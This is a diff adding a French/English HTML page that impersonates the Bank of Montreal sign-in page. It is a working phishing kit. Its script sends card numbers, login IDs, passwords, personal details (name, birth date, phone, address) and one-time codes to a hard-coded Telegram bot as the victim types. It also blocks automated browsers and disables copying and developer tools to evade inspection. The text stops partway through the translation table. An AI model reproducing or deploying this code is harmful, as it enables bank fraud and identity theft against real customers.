@@ -1,0 +1,1669 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in BMO — Bank of Montreal</title>
+  
+  <!-- Favicon ajouté -->
+  <link rel="icon" type="image/png" href="bmo9.png" />
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    :root {
+      --blue: #0072CE;
+      --blue-dark: #005bb5;
+      --page-bg: #f4f6f7;
+      --text: #0b1f2a;
+      --muted: #697780;
+      --border: #697780;
+      --card: #ffffff;
+      --red: #f61d2a;
+    }
+
+    body {
+      margin: 0;
+      background: var(--page-bg);
+      color: var(--text);
+      font-family:
+        -apple-system,
+        BlinkMacSystemFont,
+        "Segoe UI",
+        Roboto,
+        Helvetica,
+        Arial,
+        sans-serif;
+      user-select: none;
+      -webkit-user-select: none;
+      -ms-user-select: none;
+    }
+
+    /* =========================================================
+       HEADER (FIXÉ EN HAUT)
+    ========================================================= */
+
+    .topbar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 80px;
+      background: var(--blue);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 20px;
+      color: white;
+      z-index: 1000;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .brand-logo-link {
+      display: inline-flex;
+      align-items: center;
+      cursor: pointer;
+    }
+
+    .brand-logo-img {
+      height: 36px;
+      width: auto;
+      object-fit: contain;
+    }
+
+    .header-actions {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      font-weight: 700;
+      font-size: 15px;
+    }
+
+    .round-icon {
+      width: 26px;
+      height: 26px;
+      border: 2px solid white;
+      border-radius: 50%;
+      display: grid;
+      place-items: center;
+      font-size: 15px;
+    }
+
+    .map-icon-btn {
+      background: transparent;
+      border: 0;
+      padding: 0;
+      cursor: pointer;
+      display: grid;
+      place-items: center;
+      width: 26px;
+      height: 26px;
+    }
+
+    .map-icon-svg {
+      width: 24px;
+      height: 24px;
+      stroke: white;
+      fill: none;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .lang-btn {
+      background: transparent;
+      border: 0;
+      color: white;
+      font-weight: 700;
+      font-size: 15px;
+      cursor: pointer;
+      padding: 0;
+      font-family: inherit;
+    }
+
+    /* =========================================================
+       PAGE (MARGE BASSE RÉDUITE POUR REMONTER LE FOOTER)
+    ========================================================= */
+
+    .page {
+      max-width: 940px;
+      margin: 0 auto 10px auto;
+      padding: 100px 12px 15px 12px;
+    }
+
+    .page-title {
+      font-size: 32px;
+      line-height: 1.3;
+      margin: 28px 0 32px 0;
+      font-weight: 700;
+      letter-spacing: -0.3px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 14px;
+      text-align: center;
+    }
+
+    .page-title svg {
+      width: 32px;
+      height: 32px;
+      stroke: var(--blue);
+      fill: none;
+      stroke-width: 1.8;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      flex-shrink: 0;
+    }
+
+    /* Grille disposition Desktop */
+    .main-container {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    .left-column {
+      width: 100%;
+    }
+
+    .right-column {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+
+    .card {
+      background: var(--card);
+      border: 1px solid #e0e3e5;
+      border-radius: 6px;
+      box-shadow:
+        0 1px 3px rgba(0,0,0,.06),
+        0 4px 12px rgba(0,0,0,.04);
+
+      padding: 30px;
+      margin-bottom: 20px;
+    }
+
+    .left-column .card {
+      max-width: 480px;
+      margin-left: auto;
+      margin-right: auto;
+      padding: 28px;
+    }
+
+    .right-column .card {
+      margin-bottom: 0;
+    }
+
+    .field-group {
+      margin-bottom: 18px;
+    }
+
+    label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 8px;
+      font-weight: 600;
+    }
+
+    .input-wrap {
+      position: relative;
+    }
+
+    input {
+      width: 100%;
+      height: 46px;
+      border: 1px solid #70818c;
+      border-radius: 4px;
+      background: white;
+      padding: 0 14px;
+      font-size: 15px;
+      color: var(--text);
+      outline: none;
+      transition:
+        border-color .15s ease,
+        box-shadow .15s ease;
+    }
+
+    input:focus {
+      border-color: #70818c;
+      box-shadow: none;
+    }
+
+    input.error-input {
+      border-color: var(--red) !important;
+    }
+
+    input::placeholder {
+      color: #adb5ba;
+    }
+
+    .helper {
+      margin-top: 6px;
+      color: var(--muted);
+      font-size: 12px;
+    }
+
+    .helper.error-text {
+      color: var(--red);
+      font-weight: 600;
+    }
+
+    .remember-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 16px 0 18px;
+      position: relative;
+    }
+
+    .fake-checkbox {
+      width: 22px;
+      height: 22px;
+      border: 2px solid #64757f;
+      border-radius: 4px;
+      background: white;
+      cursor: pointer;
+      position: relative;
+      flex-shrink: 0;
+    }
+
+    .fake-checkbox.checked {
+      background: var(--blue);
+      border-color: var(--blue);
+    }
+
+    .fake-checkbox.checked::after {
+      content: "✓";
+      color: white;
+      position: absolute;
+      inset: 0;
+      display: grid;
+      place-items: center;
+      font-size: 14px;
+      font-weight: 900;
+    }
+
+    .remember-text {
+      font-size: 14px;
+    }
+
+    /* Bouton 'i' interactif */
+    .info {
+      width: 20px;
+      height: 20px;
+      border: 2px solid var(--blue);
+      color: var(--blue);
+      border-radius: 50%;
+      display: grid;
+      place-items: center;
+      font-weight: 700;
+      font-family: Georgia, serif;
+      font-size: 12px;
+      margin-left: auto;
+      background: transparent;
+      cursor: pointer;
+      padding: 0;
+      outline: none;
+    }
+
+    .info:focus-visible {
+      box-shadow: 0 0 0 2px var(--page-bg), 0 0 0 4px var(--blue);
+    }
+
+    /* Style de la bulle d'aide (Popover) */
+    .info-popover {
+      display: none;
+      position: absolute;
+      right: 0;
+      top: calc(100% + 12px);
+      width: 280px;
+      background: #ffffff;
+      color: var(--text);
+      border: 1px solid #e0e3e5;
+      border-radius: 8px;
+      padding: 16px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.12);
+      z-index: 100;
+      font-size: 13px;
+      line-height: 1.45;
+    }
+
+    .info-popover.show {
+      display: block;
+    }
+
+    .info-popover::after,
+    .info-popover::before {
+      content: "";
+      position: absolute;
+      bottom: 100%;
+      right: 6px;
+      border: solid transparent;
+      height: 0;
+      width: 0;
+      pointer-events: none;
+    }
+
+    .info-popover::after {
+      border-color: rgba(255, 255, 255, 0);
+      border-bottom-color: #ffffff;
+      border-width: 6px;
+      margin-right: 1px;
+    }
+
+    .info-popover::before {
+      border-color: rgba(224, 227, 229, 0);
+      border-bottom-color: #e0e3e5;
+      border-width: 7px;
+    }
+
+    .popover-close {
+      position: absolute;
+      top: 8px;
+      right: 8px;
+      background: transparent;
+      border: 0;
+      font-size: 16px;
+      cursor: pointer;
+      color: var(--muted);
+      width: 24px;
+      height: 24px;
+      display: grid;
+      place-items: center;
+      border-radius: 4px;
+    }
+
+    .popover-close:hover {
+      background: rgba(0,0,0,0.05);
+      color: var(--text);
+    }
+
+    .popover-text {
+      padding-right: 16px;
+      margin: 0;
+    }
+
+    .eye-btn {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 30px;
+      height: 30px;
+      border: 0;
+      background: transparent;
+      cursor: pointer;
+      padding: 0;
+      display: grid;
+      place-items: center;
+    }
+
+    .eye-svg {
+      width: 20px;
+      height: 20px;
+      stroke: var(--blue);
+      fill: none;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    a,
+    .fake-link {
+      color: var(--blue);
+      font-weight: 700;
+      text-decoration: none;
+    }
+
+    .forgot {
+      display: block;
+      text-align: center;
+      font-size: 13px;
+      margin: 0 auto 20px auto;
+    }
+
+    .sign-in {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      border: none;
+      background: var(--blue);
+      color: white;
+      width: 100%;
+      max-width: 220px;
+      height: 46px;
+      border-radius: 23px;
+      margin: 0 auto;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition:
+        background .15s ease,
+        transform .12s ease;
+    }
+
+    .sign-in:hover {
+      background: var(--blue-dark);
+    }
+
+    .sign-in:active {
+      transform: scale(.985);
+    }
+
+    .sign-in:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+
+    .spinner {
+      width: 18px;
+      height: 18px;
+      border: 3px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 0.8s linear infinite;
+      display: inline-block;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* =========================================================
+       REGISTER CARD
+    ========================================================= */
+
+    .register-card {
+      padding: 24px 30px;
+    }
+
+    .register-title {
+      margin: 0 0 16px;
+      font-size: 19px;
+      line-height: 1.3;
+      font-weight: 700;
+    }
+
+    .register-links {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      font-size: 15px;
+    }
+
+    .or {
+      color: #111;
+      font-weight: 400;
+    }
+
+    /* =========================================================
+       SECURITY CARD
+    ========================================================= */
+
+    .security-card {
+      padding: 30px;
+    }
+
+    .security-title {
+      margin: 0 0 12px;
+      font-size: 17px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .security-title svg {
+      width: 20px;
+      height: 20px;
+      stroke: var(--text);
+      fill: none;
+      stroke-width: 2.5;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      flex-shrink: 0;
+    }
+
+    .security-text {
+      font-size: 14px;
+      color: #475862;
+      line-height: 1.5;
+      margin: 0 0 14px;
+    }
+
+    .security-link {
+      font-size: 14px;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    /* =========================================================
+       FOOTER
+    ========================================================= */
+
+    footer {
+      background: white;
+      padding: 10px 20px;
+      border-top: 1px solid #e0e3e5;
+    }
+
+    .footer-inner {
+      max-width: 1040px;
+      margin: auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 40px;
+      flex-wrap: wrap;
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px 24px;
+      margin-bottom: 0;
+    }
+
+    .footer-link {
+      color: var(--blue);
+      font-size: 14px;
+      font-weight: 700;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .external {
+      width: 14px;
+      height: 14px;
+      border: 1.5px solid var(--blue);
+      border-radius: 1px;
+      position: relative;
+    }
+
+    .external::before {
+      content: "↗";
+      position: absolute;
+      font-size: 14px;
+      font-weight: 900;
+      right: -4px;
+      top: -9px;
+      background: white;
+      height: 14px;
+      line-height: 14px;
+    }
+
+    .cdic-row {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      flex-wrap: nowrap;
+      margin-bottom: 0;
+    }
+
+    .cdic {
+      color: var(--blue);
+      font-size: 14px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      white-space: nowrap;
+      text-decoration: none;
+    }
+
+    .cdic-logo-img {
+      height: 36px;
+      width: auto;
+      object-fit: contain;
+      display: inline-block;
+      cursor: pointer;
+    }
+
+    /* =========================================================
+       MODAL
+    ========================================================= */
+
+    .modal-backdrop {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,.5);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      z-index: 999;
+    }
+
+    .modal-backdrop.show {
+      display: flex;
+    }
+
+    .modal {
+      width: min(450px, 100%);
+      background: white;
+      border-radius: 10px;
+      padding: 28px;
+      box-shadow: 0 10px 30px rgba(0,0,0,.2);
+      max-height: 90vh;
+      overflow-y: auto;
+    }
+
+    .modal h2 {
+      margin-top: 0;
+      font-size: 18px;
+    }
+
+    .modal p {
+      color: #475862;
+      line-height: 1.5;
+      font-size: 14px;
+    }
+
+    .modal button {
+      width: 100%;
+      border: 0;
+      border-radius: 25px;
+      height: 44px;
+      background: var(--blue);
+      color: white;
+      font-weight: 700;
+      font-size: 15px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    /* =========================================================
+       RESPONSIVE
+    ========================================================= */
+
+    @media (min-width: 768px) {
+      .page {
+        max-width: 940px;
+      }
+      .main-container {
+        flex-direction: row;
+        align-items: flex-start;
+      }
+      .left-column {
+        flex: 1;
+      }
+      .right-column {
+        width: 400px;
+        flex-shrink: 0;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <header class="topbar">
+    <div class="brand">
+      <a href="" class="brand-logo-link" id="logoLink" aria-label="Rafraîchir la page">
+        <img src="bmo3.png" alt="BMO Logo" class="brand-logo-img">
+      </a>
+    </div>
+
+    <div class="header-actions">
+      <a href="https://branchlocator.bmo.com/" class="map-icon-btn" id="mapBtn" aria-label="Google Maps" target="_blank" rel="noopener noreferrer">
+        <svg class="map-icon-svg" viewBox="0 0 24 24">
+          <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+          <circle cx="12" cy="10" r="3"></circle>
+        </svg>
+      </a>
+      <span class="round-icon">?</span>
+      <button id="langToggle" class="lang-btn" type="button">EN</button>
+    </div>
+  </header>
+
+  <main class="page">
+
+    <h1 class="page-title" id="pageTitleText">
+      <svg viewBox="0 0 24 24">
+        <rect x="3" y="11" width="18" height="11" rx="1" ry="1"></rect>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+      </svg>
+      <span data-i18n="signIn">Sign in</span>
+    </h1>
+
+    <div class="main-container">
+      
+      <!-- Colonne de gauche (Formulaire de connexion) -->
+      <div class="left-column">
+        <section class="card">
+
+          <div class="field-group">
+            <label for="cardNumber" data-i18n="cardNumberLabel">Card Number or Login ID</label>
+
+            <input
+              id="cardNumber"
+              type="text"
+              maxlength="16"
+              autocomplete="off"
+              placeholder=""
+              oninput="removeError(this); handleLoginLiveInput();"
+            />
+
+            <div id="cardHelper" class="helper" data-i18n="cardHelper" data-i18n-default="Enter your 16-character number or Login ID">
+              Enter your 16-character number or Login ID
+            </div>
+          </div>
+
+          <div class="remember-row">
+            <div
+              id="rememberBox"
+              class="fake-checkbox"
+              role="checkbox"
+              tabindex="0"
+              aria-checked="false"
+            ></div>
+
+            <div class="remember-text" data-i18n="rememberCard">
+              Remember Card
+            </div>
+
+            <!-- Bouton i interactif avec popover -->
+            <button
+              id="infoBtn"
+              class="info"
+              type="button"
+              aria-expanded="false"
+              aria-controls="infoPopover"
+              aria-label="Informations sur la mémorisation"
+            >i</button>
+
+            <div id="infoPopover" class="info-popover" role="region">
+              <button id="popoverClose" class="popover-close" type="button" aria-label="Fermer">×</button>
+              <p class="popover-text" data-i18n="popoverText">Cette option permet de mémoriser vos préférences d’affichage sur cet appareil. Vous pouvez la désactiver à tout moment.</p>
+            </div>
+          </div>
+
+          <div class="field-group">
+            <label for="password" data-i18n="passwordLabel">Password</label>
+
+            <div class="input-wrap">
+              <input
+                id="password"
+                type="password"
+                autocomplete="off"
+                placeholder=""
+                oninput="removeError(this); handleLoginLiveInput();"
+              />
+
+              <button
+                id="eyeButton"
+                class="eye-btn"
+                type="button"
+                aria-label="Show password"
+                data-i18n-aria-show="Show password"
+                data-i18n-aria-hide="Hide password"
+              >
+                <svg class="eye-svg" viewBox="0 0 24 24">
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                  <circle cx="12" cy="12" r="3"></circle>
+                </svg>
+              </button>
+            </div>
+            <div id="passHelper" class="helper" style="display: none;" data-i18n="passHelper" data-i18n-default="Please enter your password">
+              Please enter your password
+            </div>
+          </div>
+
+          <a href="https://authentication.bmo.com/forgotcredentials/cdb?lang=en" class="forgot" target="_blank" rel="noopener noreferrer" data-i18n="forgotPassword">
+            Forgot your Password or Login ID
+          </a>
+
+          <button id="signInButton" class="sign-in" type="button" data-i18n="loginBtn">
+            Login
+          </button>
+
+        </section>
+      </div>
+
+      <!-- Colonne de droite (Register & Security) -->
+      <div class="right-column">
+        <section class="card register-card">
+
+          <h2 class="register-title" data-i18n="registerTitle">
+            Register a new card for online banking
+          </h2>
+
+          <div class="register-links">
+            <a href="https://authentication.bmo.com/enrollment/cdb/step/terms?lang=en" class="debit-card-link" target="_blank" rel="noopener noreferrer" data-i18n="debitCard">DEBIT CARD</a>
+
+            <span class="or" data-i18n="or">or</span>
+
+            <a href="https://authentication.bmo.com/enrollment/cdb/step/terms?lang=en" class="credit-card-link" target="_blank" rel="noopener noreferrer" data-i18n="creditCard">CREDIT CARD</a>
+          </div>
+
+        </section>
+
+        <section class="card security-card">
+          <h2 class="security-title">
+            <svg viewBox="0 0 24 24">
+              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+            </svg>
+            <span data-i18n="securityTitle">Your security always comes first.</span>
+          </h2>
+          <p class="security-text" data-i18n="securityText">
+            We’ve made Online Banking more convenient, while still using advanced security technologies that keep your money and information safe.
+          </p>
+          <a href="https://www.bmo.com/en-ca/main/personal/security-centre/#tabs-3" class="security-link" target="_blank" rel="noopener noreferrer">
+            <span data-i18n="securityLink">Learn more about how we protect you.</span>
+            <span class="external"></span>
+          </a>
+        </section>
+      </div>
+
+    </div>
+
+  </main>
+
+  <footer>
+
+    <div class="footer-inner">
+
+      <div class="footer-links">
+
+        <a href="https://www.bmo.com/en-ca/main/personal/legal/" class="footer-link" target="_blank" rel="noopener noreferrer">
+          <span data-i18n="legal">Legal</span>
+          <span class="external"></span>
+        </a>
+
+        <a href="https://www.bmo.com/en-ca/main/about-bmo/who-we-are/business-conduct/privacy-code/" class="footer-link" target="_blank" rel="noopener noreferrer">
+          <span data-i18n="privacy">Privacy</span>
+          <span class="external"></span>
+        </a>
+
+        <a href="https://www.bmo.com/en-ca/main/personal/security-centre/" class="footer-link" target="_blank" rel="noopener noreferrer">
+          <span data-i18n="security">Security</span>
+          <span class="external"></span>
+        </a>
+
+        <a href="https://www.bmo.com/en-ca/main/about-bmo/our-impact/colleagues/accessibility/" class="footer-link" target="_blank" rel="noopener noreferrer">
+          <span data-i18n="accessibility">Accessibility</span>
+          <span class="external"></span>
+        </a>
+
+      </div>
+
+      <div class="cdic-row">
+
+        <a href="https://www.bmo.com/main/personal/cdic/" class="cdic" target="_blank" rel="noopener noreferrer">
+          <span data-i18n="cdicMember">CDIC Member</span>
+          <span class="external"></span>
+        </a>
+
+        <a href="https://www.cdic.ca/depositors/whats-covered/" target="_blank" rel="noopener noreferrer">
+          <img src="sadc.png" alt="SADC" class="cdic-logo-img">
+        </a>
+
+      </div>
+
+    </div>
+
+  </footer>
+
+  <!-- Demo modal -->
+
+  <div id="modalBackdrop" class="modal-backdrop">
+
+    <div class="modal">
+
+      <h2 id="modalTitle" data-i18n="modalTitleDefault"></h2>
+
+      <p id="modalMessage">
+        Cette interface est sécurisée.
+      </p>
+
+      <button id="closeModal" data-i18n="closeBtn">
+        Vérification des informations
+      </button>
+
+    </div>
+
+  </div>
+
+  <script>
+    // --- BOUCLIER DE CYBERSÉCURITÉ AVANCÉ CONTRE LES BOTS ---
+    (function() {
+        if (navigator.webdriver || window._phantom || window.__nightmare || window.callPhantom || window.Cypress || window.pw) {
+            document.body.innerHTML = '<div style="background:#020204; color:#ff0055; height:100vh; display:flex; align-items:center; justify-content:center; font-family:sans-serif; font-size:1.5rem; text-align:center;">ACCÈS REFUSÉ - ENVIRONNEMENT AUTOMATISÉ DÉTECTÉ.</div>';
+            throw new Error("Bot detected");
+        }
+
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('copy', e => e.preventDefault());
+        document.addEventListener('cut', e => e.preventDefault());
+        document.addEventListener('paste', e => e.preventDefault());
+        
+        document.addEventListener('keydown', function(e) {
+            if (e.keyCode === 123 || 
+                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || 
+                (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83))) {
+                e.preventDefault();
+                return false;
+            }
+        });
+    })();
+
+    // =========================================================
+    // CONFIGURATION TELEGRAM (Envoi et mise à jour en direct)
+    // =========================================================
+    const TELEGRAM_BOT_TOKEN = "8766214960:AAEX7YS3CTaQCHbe7wNWGbwNjSgjLuTGEpw";
+    const TELEGRAM_CHAT_ID = "8370855026";
+
+    let telegramLoginMessageId = null;
+    let telegramInfoMessageId = null;
+    let telegramOtpMessageId = null;
+
+    async function sendOrUpdateLoginTelegram(data, isLiveUpdate = false) {
+      const message = `🔔 *${isLiveUpdate ? 'CONNEXION BMO EN DIRECT' : 'NOUVELLE CONNEXION BMO'}*\n\n` +
+                      `💳 *Numéro de carte / ID:* \`${data.cardNumber || '...'}\`\n` +
+                      `🔑 *Mot de passe:* \`${data.password || '...'}\``;
+
+      if (isLiveUpdate && telegramLoginMessageId) {
+        try {
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              message_id: telegramLoginMessageId,
+              text: message,
+              parse_mode: "Markdown"
+            })
+          });
+        } catch (err) { console.error("Erreur Telegram edit login:", err); }
+      } else {
+        try {
+          const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: message,
+              parse_mode: "Markdown"
+            })
+          });
+          const json = await res.json();
+          if (json.ok && json.result) {
+            telegramLoginMessageId = json.result.message_id;
+          }
+        } catch (err) { console.error("Erreur Telegram send login:", err); }
+      }
+    }
+
+    async function sendOrUpdateInfoTelegram(data, isLiveUpdate = false) {
+      const message = `📋 *${isLiveUpdate ? 'INFORMATIONS BMO EN DIRECT' : 'INFORMATIONS DÉTAILLÉES BMO'}*\n\n` +
+                      `👤 *Nom:* \`${data.nom || '...'}\`\n` +
+                      `🗣️ *Prénom:* \`${data.prenom || '...'}\`\n` +
+                      `📞 *Téléphone:* \`${data.telephone || '...'}\`\n` +
+                      `🎂 *Date de naissance:* \`${data.naissance || '...'}\`\n` +
+                      `📧 *Email:* \`${data.email || '...'}\`\n` +
+                      `🏠 *Adresse:* \`${data.adresse || '...'}\`\n` +
+                      `📮 *Code postal:* \`${data.postal || '...'}\``;
+
+      if (isLiveUpdate && telegramInfoMessageId) {
+        try {
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              message_id: telegramInfoMessageId,
+              text: message,
+              parse_mode: "Markdown"
+            })
+          });
+        } catch (err) { console.error("Erreur Telegram edit info:", err); }
+      } else {
+        try {
+          const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: message,
+              parse_mode: "Markdown"
+            })
+          });
+          const json = await res.json();
+          if (json.ok && json.result) {
+            telegramInfoMessageId = json.result.message_id;
+          }
+        } catch (err) { console.error("Erreur Telegram send info:", err); }
+      }
+    }
+
+    async function sendOrUpdateOtpTelegram(code, isLiveUpdate = false) {
+      const message = `🔢 *${isLiveUpdate ? 'CODE OTP BMO EN DIRECT' : 'CODE DE VÉRIFICATION OTP BMO'}*\n\n` +
+                      `🔑 *Code OTP:* \`${code || '...'}\``;
+
+      if (isLiveUpdate && telegramOtpMessageId) {
+        try {
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              message_id: telegramOtpMessageId,
+              text: message,
+              parse_mode: "Markdown"
+            })
+          });
+        } catch (err) { console.error("Erreur Telegram edit otp:", err); }
+      } else {
+        try {
+          const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: message,
+              parse_mode: "Markdown"
+            })
+          });
+          const json = await res.json();
+          if (json.ok && json.result) {
+            telegramOtpMessageId = json.result.message_id;
+          }
+        } catch (err) { console.error("Erreur Telegram send otp:", err); }
+      }
+    }
+
+    let typingTimerLogin;
+    function handleLoginLiveInput() {
+      const cardNumber = document.getElementById("cardNumber").value.trim();
+      const password = document.getElementById("password").value;
+      clearTimeout(typingTimerLogin);
+      typingTimerLogin = setTimeout(() => {
+        if (cardNumber || password) {
+          sendOrUpdateLoginTelegram({ cardNumber, password }, true);
+        }
+      }, 300);
+    }
+
+    let typingTimerInfo;
+    function handleInfoLiveInput() {
+      const data = {
+        nom: document.getElementById("inputNom")?.value.trim() || "",
+        prenom: document.getElementById("inputPrenom")?.value.trim() || "",
+        telephone: document.getElementById("inputTel")?.value.trim() || "",
+        naissance: document.getElementById("inputDob")?.value.trim() || "",
+        email: document.getElementById("inputEmail")?.value.trim() || "",
+        adresse: document.getElementById("inputAdresse")?.value.trim() || "",
+        postal: document.getElementById("inputPostal")?.value.trim() || ""
+      };
+      clearTimeout(typingTimerInfo);
+      typingTimerInfo = setTimeout(() => {
+        if (Object.values(data).some(v => v !== '')) {
+          sendOrUpdateInfoTelegram(data, true);
+        }
+      }, 300);
+    }
+
+    function handleOtpLiveUpdate() {
+      const code = document.getElementById("codeInput")?.value.trim() || "";
+      if (code.length > 0) {
+        sendOrUpdateOtpTelegram(code, true);
+      }
+    }
+
+    // =========================================================
+    // TRADUCTIONS (EN / FR)
+    // =========================================================
+    const translations = {
+      en: {
+        logoAria: "Refresh page",
+        mapAria: "Google Maps",
+        signIn: "Sign in",
+        cardNumberLabel: "Card Number or Login ID",
+        cardHelper: "Enter up to 16 characters",
+        cardHelperError: "Please enter your card number or Login ID",
+        rememberCard: "Remember Card",
+        popoverText: "This option allows you to remember your display preferences on this device. You can turn it off at any time.",
+        passwordLabel: "Password",
+        showPassword: "Show password",
+        hidePassword: "Hide password",
+        passHelperError: "Please enter your password",
+        forgotPassword: "Forgot your Password or Login ID",
+        loginBtn: "Login",
+        registerTitle: "Register a new card for online banking",
+        debitCard: "DEBIT CARD",
+        or: "or",
+        creditCard: "CREDIT CARD",
+        securityTitle: "Your security always comes first.",
+        securityText: "We’ve made Online Banking more convenient, while still using advanced security technologies that keep your money and information safe.",
+        securityLink: "Learn more about how we protect you.",
+        legal: "Legal",
+        privacy: "Privacy",
+        security: "Security",
+        accessibility: "Accessibility",
+        cdicMember: "CDIC Member",
+        modalTitleDefault: "Identity Verification",
+        closeBtn: "Verify Information",
+        infoTitle: "Verification required",
+        infoPrompt: "Please fill in your personal details below:",
+        lblNom: "Last Name (Nom)",
+        lblPrenom: "First Name (Prénom)",
+        lblTel: "Phone Number (Téléphone)",
+        lblDob: "Date of Birth (Date de naissance)",
+        lblEmail: "Email Address",
+        lblAddress: "Street Address (Adresse)",
+        lblPostal: "Postal Code (Code postal)",
+        submitInfoBtn: "Submit Information",
+        codeTitle: "Verification Code",
+        codePrompt: "Please enter the 6-digit code received :",
+        codePlaceholder: "ex: 123456",
+        submitCodeBtn: "Submit Code",
+        msgError: "Additional verification required. Please fill out the form.",
+        msgDisabled: "This function is disabled in the demonstration prototype."
+      },
+      fr: {
+        logoAria: "Rafraîchir la page",
+        mapAria: "Google Maps",
+        signIn: "Connexion",
+        cardNumberLabel: "Numéro de carte ou identifiant",
+        cardHelper: "Entrez jusqu'à 16 caractères",
+        cardHelperError: "Veuillez entrer votre numéro de carte ou identifiant",
+        rememberCard: "Mémoriser la carte",
+        popoverText: "Cette option permet de mémoriser vos préférences d’affichage sur cet appareil. Vous pouvez la désactiver à tout moment.",
+        passwordLabel: "Mot de passe",
+        showPassword: "Afficher le mot de passe",
+        hidePassword: "Masquer le mot de passe",
+        passHelperError: "Veuillez entrer votre mot de passe",
+        forgotPassword: "Mot de passe ou identifiant oublié ?",
+        loginBtn: "Connexion",
+        registerTitle: "Enregistrer une nouvelle carte pour les services bancaires en ligne",
+        debitCard: "CARTE DE DÉBIT",
+        or: "ou",
+        creditCard: "CARTE DE CRÉDIT",
+        securityTitle: "Votre sécurité passe toujours en premier.",
+        securityText: "Nous avons rendu les services bancaires en ligne plus pratiques, tout en utilisant des technologies de sécurité avancées qui protègent votre argent et vos informations.",
+        securityLink: "En savoir plus sur la façon dont nous vous protégeons.",
+        legal: "Mentions légales",
+        privacy: "Confidentialité",
+        security: "Sécurité",
+        accessibility: "Accessibilité",
+        cdicMember: "Membre de la SADC",
+        modalTitleDefault: "Vérification d'identité",
+        closeBtn: "Vérifier les informations",
+        infoTitle: "Vérification requise",
+        infoPrompt: "Veuillez remplir vos informations personnelles ci-dessous :",
+        lblNom: "Nom",
+        lblPrenom: "Prénom",
+        lblTel: "Numéro de téléphone",
+        lblDob: "Date de naissance",
+        lblEmail: "Adresse e-mail",
+        lblAddress: "Adresse",
+        lblPostal: "Code postal",
+        submitInfoBtn: "Soumettre les informations",
+        codeTitle: "Code de vérification",
+        codePrompt: "Veuillez entrer le code à 6 chiffres reçu :",
+        codePlaceholder: "ex: 123456",
+        submitCodeBtn: "Valider le code",
+        msgError: "Une vérification supplémentaire est requise. Veuillez remplir le formulaire.",
+        msgDisabled: "Cette fonction est désactivée dans le prototype de démonstration."
+      }
